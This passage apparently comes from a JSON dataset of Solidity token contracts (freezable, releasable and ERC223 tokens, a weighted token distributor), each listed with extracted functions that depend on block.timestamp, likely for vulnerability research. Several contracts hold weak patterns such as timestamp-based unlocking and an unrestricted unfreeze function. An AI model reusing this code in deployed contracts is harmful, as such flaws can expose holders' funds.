allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n totalSupply = totalSupply.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n Mint(_to, _amount);\n Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n MintFinished();\n return true;\n }\n}\ncontract FreezableToken is StandardToken {\n mapping (bytes32 => uint64) internal chains;\n mapping (bytes32 => uint) internal freezings;\n mapping (address => uint) internal freezingBalance;\n event Freezed(address indexed to, uint64 release, uint amount);\n event Released(address indexed owner, uint amount);\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return super.balanceOf(_owner) + freezingBalance[_owner];\n }\n function actualBalanceOf(address _owner) public view returns (uint256 balance) {\n return super.balanceOf(_owner);\n }\n function freezingBalanceOf(address _owner) public view returns (uint256 balance) {\n return freezingBalance[_owner];\n }\n function freezingCount(address _addr) public view returns (uint count) {\n uint64 release = chains[toKey(_addr, 0)];\n while (release != 0) {\n count ++;\n release = chains[toKey(_addr, release)];\n }\n }\n function getFreezing(address _addr, uint _index) public view returns (uint64 _release, uint _balance) {\n for (uint i = 0; i < _index + 1; i ++) {\n _release = chains[toKey(_addr, _release)];\n if (_release == 0) {\n return;\n }\n }\n _balance = freezings[toKey(_addr, _release)];\n }\n function freezeTo(address _to, uint _amount, uint64 _until) public {\n require(_to != address(0));\n require(_amount <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_amount);\n bytes32 currentKey = toKey(_to, _until);\n freezings[currentKey] = freezings[currentKey].add(_amount);\n freezingBalance[_to] = freezingBalance[_to].add(_amount);\n freeze(_to, _until);\n Transfer(msg.sender, _to, _amount);\n Freezed(_to, _until, _amount);\n }\n function releaseOnce() public {\n bytes32 headKey = toKey(msg.sender, 0);\n uint64 head = chains[headKey];\n require(head != 0);\n require(uint64(block.timestamp) > head);\n bytes32 currentKey = toKey(msg.sender, head);\n uint64 next = chains[currentKey];\n uint amount = freezings[currentKey];\n delete freezings[currentKey];\n balances[msg.sender] = balances[msg.sender].add(amount);\n freezingBalance[msg.sender] = freezingBalance[msg.sender].sub(amount);\n if (next == 0) {\n delete chains[headKey];\n }\n else {\n chains[headKey] = next;\n delete chains[currentKey];\n }\n Released(msg.sender, amount);\n }\n function releaseAll() public returns (uint tokens) {\n uint release;\n uint balance;\n (release, balance) = getFreezing(msg.sender, 0);\n while (release != 0 && block.timestamp > release) {\n releaseOnce();\n tokens += balance;\n (release, balance) = getFreezing(msg.sender, 0);\n }\n }\n function toKey(address _addr, uint _release) internal pure returns (bytes32 result) {\n result = 0x5749534800000000000000000000000000000000000000000000000000000000;\n assembly {\n result := or(result, mul(_addr, 0x10000000000000000))\n result := or(result, _release)\n }\n }\n function freeze(address _to, uint64 _until) internal {\n require(_until > block.timestamp);\n bytes32 key = toKey(_to, _until);\n bytes32 parentKey = toKey(_to, uint64(0));\n uint64 next = chains[parentKey];\n if (next == 0) {\n chains[parentKey] = _until;\n return;\n }\n bytes32 nextKey = toKey(_to, next);\n uint parent;\n while (next != 0 && _until > next) {\n parent = next;\n parentKey = nextKey;\n next = chains[nextKey];\n nextKey = toKey(_to, next);\n }\n if (_until == next) {\n return;\n }\n if (next != 0) {\n chains[key] = next;\n }\n chains[parentKey] = _until;\n }\n}\ncontract ERC223Receiver {\n function tokenFallback(address _from, uint _value, bytes _data) public;\n}\ncontract ERC223Basic is ERC20Basic {\n function transfer(address to, uint value, bytes data) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint value, bytes data);\n}\ncontract SuccessfulERC223Receiver is ERC223Receiver {\n event Invoked(address from, uint value, bytes data);\n function tokenFallback(address _from, uint _value, bytes _data) public {\n Invoked(_from, _value, _data);\n }\n}\ncontract FailingERC223Receiver is ERC223Receiver {\n function tokenFallback(address, uint, bytes) public {\n revert();\n }\n}\ncontract ERC223ReceiverWithoutTokenFallback {\n}\ncontract BurnableToken is StandardToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n require(_value > 0);\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(burner, _value);\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n Unpause();\n }\n}\ncontract FreezableMintableToken is FreezableToken, MintableToken {\n function mintAndFreeze(address _to, uint _amount, uint64 _until) onlyOwner canMint public returns (bool) {\n totalSupply = totalSupply.add(_amount);\n bytes32 currentKey = toKey(_to, _until);\n freezings[currentKey] = freezings[currentKey].add(_amount);\n freezingBalance[_to] = freezingBalance[_to].add(_amount);\n freeze(_to, _until);\n Mint(_to, _amount);\n Freezed(_to, _until, _amount);\n Transfer(msg.sender, _to, _amount);\n return true;\n }\n}\ncontract Consts {\n uint constant TOKEN_DECIMALS = 18;\n uint8 constant TOKEN_DECIMALS_UINT8 = 18;\n uint constant TOKEN_DECIMAL_MULTIPLIER = 10 ** TOKEN_DECIMALS;\n string constant TOKEN_NAME = \"Word of mouth pro\";\n string constant TOKEN_SYMBOL = \"wmp\";\n bool constant PAUSED = true;\n address constant TARGET_USER = 0x63DA42f4151F88c7EAAeBb67783D855b4ac8AdD7;\n uint constant START_TIME = 1531087260;\n bool constant CONTINUE_MINTING = false;\n}\ncontract ERC223Token is ERC223Basic, BasicToken, FailingERC223Receiver {\n using SafeMath for uint;\n function transfer(address _to, uint _value, bytes _data) public returns (bool) {\n uint codeLength;\n assembly {\n codeLength := extcodesize(_to)\n }\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n if(codeLength > 0) {\n ERC223Receiver receiver = ERC223Receiver(_to);\n receiver.tokenFallback(msg.sender, _value, _data);\n }\n Transfer(msg.sender, _to, _value, _data);\n return true;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n bytes memory empty;\n return transfer(_to, _value, empty);\n }\n}\ncontract MainToken is Consts, FreezableMintableToken, BurnableToken, Pausable\n{\n function name() pure public returns (string _name) {\n return TOKEN_NAME;\n }\n function symbol() pure public returns (string _symbol) {\n return TOKEN_SYMBOL;\n }\n function decimals() pure public returns (uint8 _decimals) {\n return TOKEN_DECIMALS_UINT8;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool _success) {\n require(!paused);\n return super.transferFrom(_from, _to, _value);\n }\n function transfer(address _to, uint256 _value) public returns (bool _success) {\n require(!paused);\n return super.transfer(_to, _value);\n }\n}",
  "extract_feature": [
    "function releaseOnce() public {\nbytes32 headKey = toKey(msg.sender, 0);\nuint64 head = chains[headKey];\nrequire(head != 0);\nrequire(uint64(block.timestamp) > head);\nbytes32 currentKey = toKey(msg.sender, head);\nuint64 next = chains[currentKey];\nuint amount = freezings[currentKey];\ndelete freezings[currentKey];\nbalances[msg.sender] = balances[msg.sender].add(amount);\nfreezingBalance[msg.sender] = freezingBalance[msg.sender].sub(amount);\nif (next == 0) {\ndelete chains[headKey];\n}\nelse {\nchains[headKey] = next;\ndelete chains[currentKey];\n}\nReleased(msg.sender, amount);\n}",
    "function releaseAll() public returns (uint tokens) {\nuint release;\nuint balance;\n(release, balance) = getFreezing(msg.sender, 0);\nwhile (release != 0 && block.timestamp > release) {\nreleaseOnce();\ntokens += balance;\n(release, balance) = getFreezing(msg.sender, 0);\n}\n}",
    "function freeze(address _to, uint64 _until) internal {\nrequire(_until > block.timestamp);\nbytes32 key = toKey(_to, _until);\nbytes32 parentKey = toKey(_to, uint64(0));\nuint64 next = chains[parentKey];\nif (next == 0) {\nchains[parentKey] = _until;\nreturn;\n}\nbytes32 nextKey = toKey(_to, next);\nuint parent;\nwhile (next != 0 && _until > next) {\nparent = next;\nparentKey = nextKey;\nnext = chains[nextKey];\nnextKey = toKey(_to, next);\n}\nif (_until == next) {\nreturn;\n}\nif (next != 0) {\nchains[key] = next;\n}\nchains[parentKey] = _until;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1ecd"
  },
  "filename": "10763.sol",
  "content": "pragma solidity ^0.4.21;\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\nlibrary DateTime {\n struct MyDateTime {\n uint16 year;\n uint8 month;\n uint8 day;\n uint8 hour;\n uint8 minute;\n uint8 second;\n uint8 weekday;\n }\n uint constant DAY_IN_SECONDS = 86400;\n uint constant YEAR_IN_SECONDS = 31536000;\n uint constant LEAP_YEAR_IN_SECONDS = 31622400;\n uint constant HOUR_IN_SECONDS = 3600;\n uint constant MINUTE_IN_SECONDS = 60;\n uint16 constant ORIGIN_YEAR = 1970;\n function isLeapYear(uint16 year) internal pure returns (bool) {\n if (year % 4 != 0) {\n return false;\n }\n if (year % 100 != 0) {\n return true;\n }\n if (year % 400 != 0) {\n return false;\n }\n return true;\n }\n function leapYearsBefore(uint year) internal pure returns (uint) {\n year -= 1;\n return year / 4 - year / 100 + year / 400;\n }\n function getDaysInMonth(uint8 month, uint16 year) internal pure returns (uint8) {\n if (month == 1 || month == 3 || month == 5 || month == 7 || month == 8 || month == 10 || month == 12) {\n return 31;\n }\n else if (month == 4 || month == 6 || month == 9 || month == 11) {\n return 30;\n }\n else if (isLeapYear(year)) {\n return 29;\n }\n else {\n return 28;\n }\n }\n function parseTimestamp(uint timestamp) internal pure returns (MyDateTime dt) {\n uint secondsAccountedFor = 0;\n uint buf;\n uint8 i;\n dt.year = getYear(timestamp);\n buf = leapYearsBefore(dt.year) - leapYearsBefore(ORIGIN_YEAR);\n secondsAccountedFor += LEAP_YEAR_IN_SECONDS * buf;\n secondsAccountedFor += YEAR_IN_SECONDS * (dt.year - ORIGIN_YEAR - buf);\n uint secondsInMonth;\n for (i = 1; i <= 12; i++) {\n secondsInMonth = DAY_IN_SECONDS * getDaysInMonth(i, dt.year);\n if (secondsInMonth + secondsAccountedFor > timestamp) {\n dt.month = i;\n break;\n }\n secondsAccountedFor += secondsInMonth;\n }\n for (i = 1; i <= getDaysInMonth(dt.month, dt.year); i++) {\n if (DAY_IN_SECONDS + secondsAccountedFor > timestamp) {\n dt.day = i;\n break;\n }\n secondsAccountedFor += DAY_IN_SECONDS;\n }\n dt.hour = 0;\n dt.minute = 0;\n dt.second = 0;\n dt.weekday = 0;\n }\n function getYear(uint timestamp) internal pure returns (uint16) {\n uint secondsAccountedFor = 0;\n uint16 year;\n uint numLeapYears;\n year = uint16(ORIGIN_YEAR + timestamp / YEAR_IN_SECONDS);\n numLeapYears = leapYearsBefore(year) - leapYearsBefore(ORIGIN_YEAR);\n secondsAccountedFor += LEAP_YEAR_IN_SECONDS * numLeapYears;\n secondsAccountedFor += YEAR_IN_SECONDS * (year - ORIGIN_YEAR - numLeapYears);\n while (secondsAccountedFor > timestamp) {\n if (isLeapYear(uint16(year - 1))) {\n secondsAccountedFor -= LEAP_YEAR_IN_SECONDS;\n }\n else {\n secondsAccountedFor -= YEAR_IN_SECONDS;\n }\n year -= 1;\n }\n return year;\n }\n function getMonth(uint timestamp) internal pure returns (uint8) {\n return parseTimestamp(timestamp).month;\n }\n function getDay(uint timestamp) internal pure returns (uint8) {\n return parseTimestamp(timestamp).day;\n }\n function getHour(uint timestamp) internal pure returns (uint8) {\n return uint8((timestamp / 60 / 60) % 24);\n }\n function getMinute(uint timestamp) internal pure returns (uint8) {\n return uint8((timestamp / 60) % 60);\n }\n function getSecond(uint timestamp) internal pure returns (uint8) {\n return uint8(timestamp % 60);\n }\n function toTimestamp(uint16 year, uint8 month, uint8 day) internal pure returns (uint timestamp) {\n return toTimestamp(year, month, day, 0, 0, 0);\n }\n function toTimestamp(uint16 year, uint8 month, uint8 day, uint8 hour, uint8 minute, uint8 second) internal pure returns (uint timestamp) {\n uint16 i;\n for (i = ORIGIN_YEAR; i < year; i++) {\n if (isLeapYear(i)) {\n timestamp += LEAP_YEAR_IN_SECONDS;\n }\n else {\n timestamp += YEAR_IN_SECONDS;\n }\n }\n uint8[12] memory monthDayCounts;\n monthDayCounts[0] = 31;\n if (isLeapYear(year)) {\n monthDayCounts[1] = 29;\n }\n else {\n monthDayCounts[1] = 28;\n }\n monthDayCounts[2] = 31;\n monthDayCounts[3] = 30;\n monthDayCounts[4] = 31;\n monthDayCounts[5] = 30;\n monthDayCounts[6] = 31;\n monthDayCounts[7] = 31;\n monthDayCounts[8] = 30;\n monthDayCounts[9] = 31;\n monthDayCounts[10] = 30;\n monthDayCounts[11] = 31;\n for (i = 1; i < month; i++) {\n timestamp += DAY_IN_SECONDS * monthDayCounts[i - 1];\n }\n timestamp += DAY_IN_SECONDS * (day - 1);\n timestamp += HOUR_IN_SECONDS * (hour);\n timestamp += MINUTE_IN_SECONDS * (minute);\n timestamp += second;\n return timestamp;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Claimable is Ownable {\n address public pendingOwner;\n modifier onlyPendingOwner() {\n require(msg.sender == pendingOwner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n pendingOwner = newOwner;\n }\n function claimOwnership() onlyPendingOwner public {\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract ReentrancyGuard {\n bool private reentrancyLock = false;\n modifier nonReentrant() {\n require(!reentrancyLock);\n reentrancyLock = true;\n _;\n reentrancyLock = false;\n }\n}\ncontract StandardBurnableToken is StandardToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public returns (bool) {\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n emit Burn(burner, _value);\n return true;\n }\n}\ncontract Operational is Claimable {\n address public operator;\n function Operational(address _operator) public {\n operator = _operator;\n }\n modifier onlyOperator() {\n require(msg.sender == operator);\n _;\n }\n function transferOperator(address newOperator) public onlyOwner {\n require(newOperator != address(0));\n operator = newOperator;\n }\n}\ncontract Frozenable is Operational, StandardBurnableToken, ReentrancyGuard {\n using DateTime for uint256;\n struct FrozenRecord {\n uint256 value;\n uint256 unfreezeIndex;\n }\n uint256 public frozenBalance;\n mapping (uint256 => FrozenRecord) public frozenRecords;\n uint256 mulDecimals = 100000000;\n event SystemFreeze(address indexed owner, uint256 value, uint256 unfreezeIndex);\n event Unfreeze(address indexed owner, uint256 value, uint256 unfreezeTime);\n function Frozenable(address _operator) Operational(_operator) public {}\n function systemFreeze(uint256 _value, uint256 _unfreezeTime) internal {\n uint256 unfreezeIndex = uint256(_unfreezeTime.parseTimestamp().year) * 10000 + uint256(_unfreezeTime.parseTimestamp().month) * 100 + uint256(_unfreezeTime.parseTimestamp().day);\n balances[owner] = balances[owner].sub(_value);\n frozenRecords[unfreezeIndex] = FrozenRecord({value: _value, unfreezeIndex: unfreezeIndex});\n frozenBalance = frozenBalance.add(_value);\n emit SystemFreeze(owner, _value, _unfreezeTime);\n }\n function unfreeze(uint256 timestamp) public returns (uint256 unfreezeAmount) {\n require(timestamp <= block.timestamp);\n uint256 unfreezeIndex = uint256(timestamp.parseTimestamp().year) * 10000 + uint256(timestamp.parseTimestamp().month) * 100 + uint256(timestamp.parseTimestamp().day);\n frozenBalance = frozenBalance.sub(frozenRecords[unfreezeIndex].value);\n balances[owner] = balances[owner].add(frozenRecords[unfreezeIndex].value);\n unfreezeAmount = frozenRecords[unfreezeIndex].value;\n emit Unfreeze(owner, unfreezeAmount, timestamp);\n frozenRecords[unfreezeIndex].value = 0;\n return unfreezeAmount;\n }\n}\ncontract Releaseable is Frozenable {\n using SafeMath for uint;\n uint256 public createTime;\n uint256 public standardReleaseAmount = mulDecimals.mul(512000);\n uint256 public releaseAmountPerDay = mulDecimals.mul(512000);\n uint256 public releasedSupply = 0;\n event Release(address indexed receiver, uint256 value, uint256 sysAmount, uint256 releaseTime);\n struct ReleaseRecord {\n uint256 amount;\n uint256 releaseIndex;\n }\n mapping (uint256 => ReleaseRecord) public releaseRecords;\n function Releaseable(\n address _operator, uint256 _initialSupply\n ) Frozenable(_operator) public {\n createTime = 1528732800;\n releasedSupply = _initialSupply;\n balances[owner] = _initialSupply;\n totalSupply_ = mulDecimals.mul(187140000);\n }\n function release(uint256 timestamp, uint256 sysAmount) public onlyOperator returns(uint256 _actualRelease) {\n require(timestamp >= createTime && timestamp <= block.timestamp);\n require(!checkIsReleaseRecordExist(timestamp));\n updateReleaseAmount(timestamp);\n require(sysAmount <= releaseAmountPerDay.mul(4).div(5));\n require(totalSupply_ >= releasedSupply.add(releaseAmountPerDay));\n balances[owner] = balances[owner].add(releaseAmountPerDay);\n releasedSupply = releasedSupply.add(releaseAmountPerDay);\n uint256 _releaseIndex = uint256(timestamp.parseTimestamp().year) * 10000 + uint256(timestamp.parseTimestamp().month) * 100 + uint256(timestamp.parseTimestamp().day);\n releaseRecords[_releaseIndex] = ReleaseRecord(releaseAmountPerDay, _releaseIndex);\n emit Release(owner, releaseAmountPerDay, sysAmount, timestamp);\n systemFreeze(sysAmount.div(5), timestamp.add(180 days));\n systemFreeze(sysAmount.mul(6).div(10), timestamp.add(200 years));\n return releaseAmountPerDay;\n }\n function checkIsReleaseRecordExist(uint256 timestamp) internal view returns(bool _exist) {\n bool exist = false;\n uint256 releaseIndex = uint256(timestamp.parseTimestamp().year) * 10000 + uint256(timestamp.parseTimestamp().month) * 100 + uint256(timestamp.parseTimestamp().day);\n if (releaseRecords[releaseIndex].releaseIndex == releaseIndex){\n exist = true;\n }\n return exist;\n }\n function updateReleaseAmount(uint256 timestamp) internal {\n uint256 timeElapse = timestamp.sub(createTime);\n uint256 cycles = timeElapse.div(180 days);\n if (cycles > 0) {\n if (cycles <= 10) {\n releaseAmountPerDay = standardReleaseAmount;\n for (uint index = 0; index < cycles; index++) {\n releaseAmountPerDay = releaseAmountPerDay.div(2);\n }\n } else {\n releaseAmountPerDay = 0;\n }\n }\n }\n}\ncontract CoinCool is Releaseable {\n string public standard = '2018061200';\n string public name = 'CoolToken';\n string public symbol = 'CT';\n uint8 public decimals = 8;\n function CoinCool() Releaseable(0x4068D7c2e286Cb1E72Cef90B74C823E990FaB9C2, mulDecimals.mul(3000000)) public {}\n}",
  "extract_feature": [
    "function unfreeze(uint256 timestamp) public returns (uint256 unfreezeAmount) {\nrequire(timestamp <= block.timestamp);\nuint256 unfreezeIndex = uint256(timestamp.parseTimestamp().year) * 10000 + uint256(timestamp.parseTimestamp().month) * 100 + uint256(timestamp.parseTimestamp().day);\nfrozenBalance = frozenBalance.sub(frozenRecords[unfreezeIndex].value);\nbalances[owner] = balances[owner].add(frozenRecords[unfreezeIndex].value);\nunfreezeAmount = frozenRecords[unfreezeIndex].value;\nemit Unfreeze(owner, unfreezeAmount, timestamp);\nfrozenRecords[unfreezeIndex].value = 0;\nreturn unfreezeAmount;\n}",
    "function release(uint256 timestamp, uint256 sysAmount) public onlyOperator returns(uint256 _actualRelease) {\nrequire(timestamp >= createTime && timestamp <= block.timestamp);\nrequire(!checkIsReleaseRecordExist(timestamp));\nupdateReleaseAmount(timestamp);\nrequire(sysAmount <= releaseAmountPerDay.mul(4).div(5));\nrequire(totalSupply_ >= releasedSupply.add(releaseAmountPerDay));\nbalances[owner] = balances[owner].add(releaseAmountPerDay);\nreleasedSupply = releasedSupply.add(releaseAmountPerDay);\nuint256 _releaseIndex = uint256(timestamp.parseTimestamp().year) * 10000 + uint256(timestamp.parseTimestamp().month) * 100 + uint256(timestamp.parseTimestamp().day);\nreleaseRecords[_releaseIndex] = ReleaseRecord(releaseAmountPerDay, _releaseIndex);\nemit Release(owner, releaseAmountPerDay, sysAmount, timestamp);\nsystemFreeze(sysAmount.div(5), timestamp.add(180 days));\nsystemFreeze(sysAmount.mul(6).div(10), timestamp.add(200 years));\nreturn releaseAmountPerDay;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1ece"
  },
  "filename": "10782.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract TokenDistributor is Ownable {\n using SafeMath for uint;\n address public targetToken;\n address[] public stakeHolders;\n uint256 public maxStakeHolders;\n event InsufficientTokenBalance( address indexed _token, uint256 _time );\n event TokensDistributed( address indexed _token, uint256 _total, uint256 _time );\n constructor ( address _targetToken, uint256 _totalStakeHolders, address[] _stakeHolders) public Ownable() {\n setTargetToken(_targetToken);\n maxStakeHolders = _totalStakeHolders;\n if (_stakeHolders.length > 0) {\n for (uint256 count = 0; count < _stakeHolders.length && count < _totalStakeHolders; count++) {\n if (_stakeHolders[count] != 0x0) {\n _setStakeHolder(_stakeHolders[count]);\n }\n }\n }\n }\n function isDistributionDue (address _token) public view returns (bool) {\n return getTokenBalance(_token) > 1;\n }\n function isDistributionDue () public view returns (bool) {\n return getTokenBalance(targetToken) > 1;\n }\n function countStakeHolders () public view returns (uint256) {\n return stakeHolders.length;\n }\n function getTokenBalance(address _token) public view returns (uint256) {\n ERC20Basic token = ERC20Basic(_token);\n return token.balanceOf(address(this));\n }\n function getPortion (uint256 _total) public view returns (uint256) {\n return _total.div(stakeHolders.length);\n }\n function setTargetToken (address _targetToken) public onlyOwner returns (bool) {\n if(_targetToken != 0x0 && targetToken == 0x0) {\n targetToken = _targetToken;\n return true;\n }\n }\n function _setStakeHolder (address _stakeHolder) internal onlyOwner returns (bool) {\n require(countStakeHolders() < maxStakeHolders, \"Max StakeHolders set\");\n stakeHolders.push(_stakeHolder);\n return true;\n }\n function _transfer (address _token, address _recipient, uint256 _value) internal {\n ERC20Basic token = ERC20Basic(_token);\n token.transfer(_recipient, _value);\n }\n function distribute (address _token) public returns (bool) {\n uint256 balance = getTokenBalance(_token);\n uint256 perStakeHolder = getPortion(balance);\n if (balance < 1) {\n emit InsufficientTokenBalance(_token, block.timestamp);\n return false;\n } else {\n for (uint256 count = 0; count < stakeHolders.length; count++) {\n _transfer(_token, stakeHolders[count], perStakeHolder);\n }\n uint256 newBalance = getTokenBalance(_token);\n if (newBalance > 0 && getPortion(newBalance) == 0) {\n _transfer(_token, owner, newBalance);\n }\n emit TokensDistributed(_token, balance, block.timestamp);\n return true;\n }\n }\n function () public {\n distribute(targetToken);\n }\n}\ncontract WeightedTokenDistributor is TokenDistributor {\n using SafeMath for uint;\n mapping( address => uint256) public stakeHoldersWeight;\n constructor ( address _targetToken, uint256 _totalStakeHolders, address[] _stakeHolders, uint256[] _weights) public\n TokenDistributor(_targetToken, _totalStakeHolders, stakeHolders)\n {\n if (_stakeHolders.length > 0) {\n for (uint256 count = 0; count < _stakeHolders.length && count < _totalStakeHolders; count++) {\n if (_stakeHolders[count] != 0x0) {\n _setStakeHolder( _stakeHolders[count], _weights[count] );\n }\n }\n }\n }\n function getTotalWeight () public view returns (uint256 _total) {\n for (uint256 count = 0; count < stakeHolders.length; count++) {\n _total = _total.add(stakeHoldersWeight[stakeHolders[count]]);\n }\n }\n function getPortion (uint256 _total, uint256 _totalWeight, address _stakeHolder) public view returns (uint256) {\n uint256 weight = stakeHoldersWeight[_stakeHolder];\n return (_total.mul(weight)).div(_totalWeight);\n }\n function getPortion (uint256 _total) public view returns (uint256) {\n revert(\"Kindly indicate stakeHolder and totalWeight\");\n }\n function _setStakeHolder (address _stakeHolder, uint256 _weight) internal onlyOwner returns (bool) {\n stakeHoldersWeight[_stakeHolder] = _weight;\n require(super._setStakeHolder(_stakeHolder));\n return true;\n }\n function _setStakeHolder (address _stakeHolder) internal onlyOwner returns (bool) {\n revert(\"Kindly set Weights for stakeHolder\");\n }\n function distribute (address _token) public returns (bool) {\n uint256 balance = getTokenBalance(_token);\n uint256 totalWeight = getTotalWeight();\n if (balance < 1) {\n emit InsufficientTokenBalance(_token, block.timestamp);\n return false;\n } else {\n for (uint256 count = 0; count < stakeHolders.length; count++) {\n uint256 perStakeHolder = getPortion(balance, totalWeight, stakeHolders[count]);\n _transfer(_token, stakeHolders[count], perStakeHolder);\n }\n uint256 newBalance = getTokenBalance(_token);\n if (newBalance > 0) {\n _transfer(_token, owner, newBalance);\n }\n emit TokensDistributed(_token, balance, block.timestamp);\n return true;\n }\n }\n}",
  "extract_feature": [
